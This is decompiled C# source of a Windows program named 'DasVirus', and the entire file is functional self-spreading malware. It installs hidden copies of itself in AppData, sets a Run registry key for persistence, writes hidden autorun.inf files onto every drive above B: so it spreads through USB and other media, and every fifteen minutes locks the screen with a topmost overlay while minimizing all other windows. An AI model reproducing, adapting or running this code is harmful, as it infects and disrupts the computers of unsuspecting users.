using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using DasVirus.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace DasVirus;

[DesignerGenerated]
public class Form1 : Form
{
	public enum nCS_Commands
	{
		SW_HIDE = 0,
		SW_SHOWNORMAL = 1,
		SW_NORMAL = 1,
		SW_SHOWMINIMIZED = 2,
		SW_SHOWMAXIMIZED = 3,
		SW_MAXIMIZE = 3,
		SW_SHOWNOACTIVATE = 4,
		SW_SHOW = 5,
		SW_MINIMIZE = 6,
		SW_SHOWMINNOACTIVE = 7,
		SW_SHOWNA = 8,
		SW_RESTORE = 9,
		SW_SHOWDEFAULT = 10,
		SW_MAX = 10
	}

	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("Timer3")]
	private Timer _Timer3;

	[AccessedThroughProperty("Timer4")]
	private Timer _Timer4;

	private Point lPoint;

	private Point nPoint;

	private Rectangle Scr;

	private Graphics Graph;

	private bool OpStatus;

	private int PID;

	private Pen MyPen;

	[SpecialName]
	private int _0024STATIC_0024Timer1_Tick_002420211C1261_0024Ticks;

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer3_Tick;
			if (_Timer3 != null)
			{
				_Timer3.remove_Tick(eventHandler);
			}
			_Timer3 = value;
			if (_Timer3 != null)
			{
				_Timer3.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer4_Tick;
			if (_Timer4 != null)
			{
				_Timer4.remove_Tick(eventHandler);
			}
			_Timer4 = value;
			if (_Timer4 != null)
			{
				_Timer4.add_Tick(eventHandler);
			}
		}
	}

	[DebuggerNonUserCode]
	public Form1()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Control)this).add_KeyDown(new KeyEventHandler(Form1_KeyDown));
		((Form)this).add_Load((EventHandler)Form1_Load);
		lock (__ENCList)
		{
			__ENCList.Add(new WeakReference(this));
		}
		InitializeComponent();
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)MyProject.Forms.Form1);
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		components = new Container();
		Timer1 = new Timer(components);
		Timer2 = new Timer(components);
		Timer3 = new Timer(components);
		Timer4 = new Timer(components);
		((Control)this).SuspendLayout();
		Timer1.set_Interval(50);
		Timer2.set_Interval(2000);
		Timer3.set_Interval(1000);
		Timer4.set_Interval(15000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(292, 273);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_ControlBox(false);
		((Control)this).set_DoubleBuffered(true);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("DasVirus");
		((Form)this).set_TopMost(true);
		((Form)this).set_TransparencyKey(SystemColors.Control);
		((Control)this).ResumeLayout(false);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool IsWindowVisible(IntPtr hWnd);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool ShowWindow(IntPtr hWnd, nCS_Commands nCmdShow);

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (OpStatus)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void Form1_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Invalid comparison between Unknown and I4
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Invalid comparison between Unknown and I4
		e.set_SuppressKeyPress(true);
		if (((e.get_Modifiers() & 0x20000) > 0 && (int)e.get_KeyCode() == 67) ? true : false)
		{
			OpStatus = false;
			ProjectData.EndApp();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (Operators.CompareString(((ApplicationBase)MyProject.Application).get_Info().get_DirectoryPath().ToLower(), folderPath.ToLower(), false) != 0)
		{
			Process.Start("explorer.exe", ((ApplicationBase)MyProject.Application).get_Info().get_DirectoryPath());
			if (Process.GetProcessesByName("dasvirus").Length > 1)
			{
				ProjectData.EndApp();
			}
			CopyMeHidden(folderPath + "\\DasVirus.exe");
			((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("DasVirus Startup", folderPath + "\\DasVirus.exe");
			Process.Start(folderPath + "\\DasVirus.exe");
			ProjectData.EndApp();
		}
		VBMath.Randomize();
		Timer3.Start();
		Timer4.Start();
	}

	public Point GenPoint()
	{
		checked
		{
			Point result = default(Point);
			result.X = (int)Math.Round(VBMath.Rnd() * (float)Scr.Width);
			result.Y = (int)Math.Round(VBMath.Rnd() * (float)Scr.Height);
			return result;
		}
	}

	private void Timer3_Tick(object sender, EventArgs e)
	{
		if ((((ServerComputer)MyProject.Computer).get_Clock().get_LocalTime().Second == 0) & (((ServerComputer)MyProject.Computer).get_Clock().get_LocalTime().Minute % 15 == 0))
		{
			InitZlovred();
		}
	}

	public void InitZlovred()
	{
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		((Form)this).set_Opacity(1.0);
		Scr = Screen.get_PrimaryScreen().get_Bounds();
		checked
		{
			((Control)this).SetBounds(-3, -13, Scr.Width + 6, Scr.Height + 25);
			Rectangle rectangle = new Rectangle(3, 18, Scr.Width, Scr.Height);
			((Control)this).set_Region(new Region(rectangle));
			lPoint = GenPoint();
			Graph = ((Control)this).CreateGraphics();
			OpStatus = false;
			PID = Process.GetCurrentProcess().Id;
			MyPen = Pens.get_Black();
			Timer1.Start();
			Timer2.Start();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c2: Expected O, but got Unknown
		checked
		{
			_0024STATIC_0024Timer1_Tick_002420211C1261_0024Ticks++;
			if (_0024STATIC_0024Timer1_Tick_002420211C1261_0024Ticks > 100)
			{
				_0024STATIC_0024Timer1_Tick_002420211C1261_0024Ticks = 0;
				MyPen = new Pen(Color.FromArgb((int)Math.Round(VBMath.Rnd() * 255f), (int)Math.Round(VBMath.Rnd() * 255f), (int)Math.Round(VBMath.Rnd() * 255f)));
			}
			nPoint = GenPoint();
			Graph.DrawLine(MyPen, lPoint, nPoint);
			Graph.DrawString("DasVirus 1.0 beta 1 by HD", new Font("Verdana", 20f, (FontStyle)0), Brushes.get_YellowGreen(), 20f, 20f);
			lPoint = nPoint;
			Interaction.AppActivate(PID);
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					if ((processes[num2].MainWindowHandle != ((Control)this).get_Handle() && Operators.CompareString(processes[num2].ProcessName.ToLower(), "explorer", false) != 0 && IsWindowVisible(processes[num2].MainWindowHandle)) ? true : false)
					{
						ShowWindow(processes[num2].MainWindowHandle, nCS_Commands.SW_MINIMIZE);
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	private void Timer4_Tick(object sender, EventArgs e)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		checked
		{
			int num = drives.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				if (Strings.Asc(Strings.Left(drives[num2].Name, 1)) > 66)
				{
					CopyMeHidden(drives[num2].Name + "DasVirus.exe");
					try
					{
						File.SetAttributes(drives[num2].Name + "AutoRun.inf", FileAttributes.Normal);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					try
					{
						StreamWriter streamWriter = new StreamWriter(drives[num2].Name + "AutoRun.inf", append: false);
						streamWriter.Write("[AutoRun]\r\nShellExecute=DasVirus.exe");
						streamWriter.Flush();
						streamWriter.Close();
						streamWriter.Dispose();
						try
						{
							File.SetAttributes(drives[num2].Name + "autorun.inf", FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
				num2++;
			}
		}
	}

	public void CopyMeHidden(string DestPath)
	{
		try
		{
			File.SetAttributes(DestPath, FileAttributes.Normal);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(((ApplicationBase)MyProject.Application).get_Info().get_DirectoryPath() + "\\DasVirus.exe", DestPath, overwrite: true);
			try
			{
				File.SetAttributes(DestPath, FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}
}
